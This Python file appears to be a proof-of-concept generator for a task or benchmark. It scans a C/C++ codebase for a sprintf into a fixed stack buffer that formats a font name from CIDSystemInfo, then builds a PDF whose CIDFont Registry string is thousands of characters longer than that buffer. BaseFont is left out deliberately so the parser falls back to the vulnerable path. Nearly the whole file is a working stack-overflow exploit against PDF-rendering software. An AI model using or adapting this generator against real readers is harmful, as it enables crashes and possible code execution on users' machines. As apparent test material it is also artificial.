import os
import re
import tarfile
from typing import List, Optional


class Solution:
    def solve(self, src_path: str) -> bytes:
        bufsize = self._find_confident_stack_bufsize(src_path)
        ordering = "Identity"

        if bufsize is None:
            reg_len = 70000
        else:
            # Ensure overflow even considering '-', ordering, and NUL terminator.
            # Add extra slack to survive minor parsing differences.
            reg_len = max(1, bufsize + 1024)

        registry = "A" * reg_len
        return self._build_pdf_cidfont_overflow(registry, ordering)

    def _build_pdf_cidfont_overflow(self, registry: str, ordering: str) -> bytes:
        header = b"%PDF-1.4\n%\xE2\xE3\xCF\xD3\n"

        reg_b = registry.encode("ascii", "ignore")
        ord_b = ordering.encode("ascii", "ignore")

        content = b"BT /F1 12 Tf 50 150 Td (X) Tj ET\n"
        obj5 = b"<< /Length %d >>\nstream\n%sendstream" % (len(content), content)

        cid_sys = b"<< /Registry (%s) /Ordering (%s) /Supplement 0 >>" % (reg_b, ord_b)

        # Intentionally omit BaseFont in Type0 and CIDFont to encourage fallback name creation
        # from CIDSystemInfo (Registry-Ordering).
        objects = {
            1: b"<< /Type /Catalog /Pages 2 0 R >>",
            2: b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
            3: b"<< /Type /Page /Parent 2 0 R /Resources << /Font << /F1 4 0 R >> >> /MediaBox [0 0 200 200] /Contents 5 0 R >>",
            4: b"<< /Type /Font /Subtype /Type0 /Encoding /Identity-H /DescendantFonts [6 0 R] >>",
            5: obj5,
            6: b"<< /Type /Font /Subtype /CIDFontType2 /CIDSystemInfo %s /FontDescriptor 7 0 R /CIDToGIDMap /Identity /DW 1000 /W [0 [1000]] >>"
               % cid_sys,
            7: b"<< /Type /FontDescriptor /FontName /DummyCIDFont /Flags 32 /FontBBox [0 0 1000 1000] "
               b"/ItalicAngle 0 /Ascent 1000 /Descent -200 /CapHeight 1000 /StemV 80 >>",
        }

        max_obj = max(objects.keys())
        parts: List[bytes] = [header]
        offsets = [0] * (max_obj + 1)

        for i in range(1, max_obj + 1):
            offsets[i] = sum(len(p) for p in parts)
            body = objects[i]
            parts.append(b"%d 0 obj\n" % i)
            parts.append(body)
            parts.append(b"\nendobj\n")

        xref_off = sum(len(p) for p in parts)
        parts.append(b"xref\n")
        parts.append(b"0 %d\n" % (max_obj + 1))
        parts.append(b"0000000000 65535 f \n")
        for i in range(1, max_obj + 1):
            parts.append(b"%010d 00000 n \n" % offsets[i])

        parts.append(b"trailer\n")
        parts.append(b"<< /Size %d /Root 1 0 R >>\n" % (max_obj + 1))
        parts.append(b"startxref\n")
        parts.append(b"%d\n" % xref_off)
        parts.append(b"%%EOF\n")

        return b"".join(parts)

    def _find_confident_stack_bufsize(self, src_path: str) -> Optional[int]:
        texts = []
        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    if not self._is_code_file(fn):
                        continue
                    p = os.path.join(root, fn)
                    try:
                        if os.path.getsize(p) > 2_000_000:
                            continue
                        with open(p, "rb") as f:
                            data = f.read()
                    except Exception:
                        continue
                    texts.append(data)
        else:
            try:
                with tarfile.open(src_path, "r:*") as tf:
                    for m in tf.getmembers():
                        if not m.isfile():
                            continue
                        name = m.name.rsplit("/", 1)[-1]
                        if not self._is_code_file(name):
                            continue
                        if m.size <= 0 or m.size > 2_000_000:
                            continue
                        try:
                            f = tf.extractfile(m)
                            if f is None:
                                continue
                            data = f.read()
                        except Exception:
                            continue
                        texts.append(data)
            except Exception:
                return None

        # Strong indicator: CIDSystemInfo + Registry + Ordering + a "%s-%s" format nearby.
        buf_sizes: List[int] = []
        fmt_pat = re.compile(r'"[^"\n\r]*%s[^"\n\r]*-[^"\n\r]*%s[^"\n\r]*"')
        sprintf_var_pat = re.compile(r'\b(?:sprintf|vsprintf)\s*\(\s*([A-Za-z_]\w*)\s*,\s*(".*?")', re.S)
        decl_pat_template = r'\bchar\s+%s\s*\[\s*(\d+)\s*\]'
        generic_decl_pat = re.compile(r'\bchar\s+[A-Za-z_]\w*\s*\[\s*(\d+)\s*\]')

        for blob in texts:
            try:
                s = blob.decode("utf-8", "ignore")
            except Exception:
                continue
            if "CIDSystemInfo" not in s or "Registry" not in s or "Ordering" not in s:
                continue
            if "%s" not in s or "-" not in s:
                continue

            for m in fmt_pat.finditer(s):
                pos = m.start()
                win_start = max(0, pos - 4000)
                win_end = min(len(s), pos + 2000)
                w = s[win_start:win_end]

                # Prefer extracting the specific destination buffer of sprintf/vsprintf call
                # associated with that format string.
                best_local: Optional[int] = None
                for sm in sprintf_var_pat.finditer(w):
                    fmt = sm.group(2)
                    if "%s" not in fmt or "-" not in fmt:
                        continue
                    var = sm.group(1)
                    decl_pat = re.compile(decl_pat_template % re.escape(var))
                    dm = decl_pat.search(w[:sm.start()])
                    if dm:
                        try:
                            n = int(dm.group(1))
                            if 8 <= n <= 2_000_000:
                                best_local = n
                        except Exception:
                            pass

                if best_local is None:
                    # Fallback: nearest char[] size before the format string in the window.
                    sub = w[: (pos - win_start)]
                    candidates = list(generic_decl_pat.finditer(sub))
                    if candidates:
                        try:
                            n = int(candidates[-1].group(1))
                            if 8 <= n <= 2_000_000:
                                best_local = n
                        except Exception:
                            pass

                if best_local is not None:
                    buf_sizes.append(best_local)

        if not buf_sizes:
            return None
        return max(buf_sizes)

    def _is_code_file(self, name: str) -> bool:
        lower = name.lower()
        return lower.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx"))